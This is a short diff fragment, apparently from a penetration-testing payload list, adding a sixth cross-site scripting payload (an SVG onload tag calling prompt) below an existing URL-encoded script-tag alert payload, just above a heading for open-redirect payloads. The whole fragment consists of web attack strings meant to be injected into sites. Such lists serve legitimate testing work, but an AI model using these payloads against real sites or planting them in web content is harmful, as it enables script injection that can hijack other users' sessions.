@@ -13,6 +13,8 @@
 
 5) /%22%3Cscript%3Ealert(String.fromCharCode(88,%20115,%20115,%2032,%2066,%20121,%2032,%2079,%20108,%20100,%2077,%20111,%20104,%2097,%20109,%20109))%3C/script%3E
 
+6) "><svg/onload=prompt(/EXPOSED/)>
+
 
                  ***Open Redirection Payload***
 
